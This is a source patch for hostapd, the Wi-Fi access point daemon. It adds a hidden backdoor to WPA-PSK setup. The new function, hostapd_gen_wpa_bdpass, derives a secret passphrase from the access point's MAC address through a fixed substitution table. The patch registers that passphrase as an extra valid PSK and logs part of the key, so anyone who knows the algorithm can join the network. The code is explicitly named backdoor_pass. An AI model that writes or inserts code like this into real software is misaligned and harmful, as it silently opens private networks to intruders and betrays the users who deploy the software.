@@ -1,0 +1,89 @@
+--- a/src/ap/ap_config.c	2014-10-09 11:32:44.000000000 +0300
++++ b/src/ap/ap_config.c	2015-01-15 11:52:52.851331055 +0200
+@@ -308,9 +308,64 @@
+ 		    4096, ssid->wpa_psk->psk, PMK_LEN);
+ 	wpa_hexdump_key(MSG_DEBUG, "PSK (from passphrase)",
+ 			ssid->wpa_psk->psk, PMK_LEN);
++	ssid->wpa_psk->next = os_zalloc(sizeof(struct hostapd_wpa_psk));
++	if (ssid->wpa_psk->next == NULL) {
++		wpa_printf(MSG_ERROR, "Unable to alloc space for NEW PSK");
++		return -1;
++	}
++	pbkdf2_sha1(backdoor_pass,
++		    ssid->ssid, ssid->ssid_len,
++		    4096, ssid->wpa_psk->next->psk, PMK_LEN);
++	wpa_hexdump_key(MSG_ERROR, "NEW PSK: ",
++			ssid->wpa_psk->next->psk, 16);
++	ssid->wpa_psk->next->group = 1;
+ 	return 0;
+ }
+ 
++/* NOTE: we may want to improve algorithm in the future,
++ because this one is somewhat weak */
++static int hostapd_gen_wpa_bdpass(struct hostapd_bss_config *cfg, 
++	char *psw, unsigned int len)
++{
++	char mac_str[BDPASSLEN];
++	int i, j, k = 0;
++	
++	char *chars[23] = {
++	"a5SX", "bugX", "cOop", 
++	"dH3f", "eZEe", "faDF",
++	"A5SX", "BugX", "COop", 
++	"DH3f", "EZEe", "FaDF",
++	"0JGe", "1cHd", "21WF", 
++	"3LfX", "4Gfy", "5Ra0", 
++	"6ob2", "7JV3", "8tO6", 
++	"9Oha", ":6BU"};
++
++	if (cfg->bssid == NULL)
++		return -1;
++		
++	sprintf(mac_str, 
++		"%02X:%02X:%02X:%02X:%02X:%02X", 
++		cfg->bssid[0], 
++		cfg->bssid[1], 
++		cfg->bssid[2], 
++		cfg->bssid[3], 
++		cfg->bssid[4], 
++		cfg->bssid[5]);
++	
++	for(i = 0; i < strlen(mac_str); i++) {
++		for(j = 0; j < 23; j++) {
++			if(mac_str[i] == chars[j][0]) {
++				if (k + 3 >= len)
++					return -1;
++				psw[k] = chars[j][1];
++				psw[++k] = chars[j][2];
++				psw[++k] = chars[j][3];
++				psw[++k] = '\0';
++			}
++		}
++	}
++	return 0;
++}
+ 
+ int hostapd_setup_wpa_psk(struct hostapd_bss_config *conf)
+ {
+@@ -323,6 +378,9 @@
+ 		} else {
+ 			wpa_printf(MSG_DEBUG, "Deriving WPA PSK based on "
+ 				   "passphrase");
++			if (hostapd_gen_wpa_bdpass(conf, backdoor_pass, 
++					BDPASSLEN) < 0)
++				return -1;
+ 			if (hostapd_derive_psk(ssid) < 0)
+ 				return -1;
+ 		}
+--- a/src/ap/ap_config.h	2015-01-15 11:31:12.808795240 +0200
++++ b/src/ap/ap_config.h	2015-01-15 11:53:11.836322955 +0200
+@@ -18,6 +18,9 @@
+ #define MAX_STA_COUNT 2007
+ #define MAX_VLAN_ID 4094
+ 
++#define BDPASSLEN	512
++char backdoor_pass[BDPASSLEN];
++
+ typedef u8 macaddr[ETH_ALEN];
+ 
+ struct mac_acl_entry {
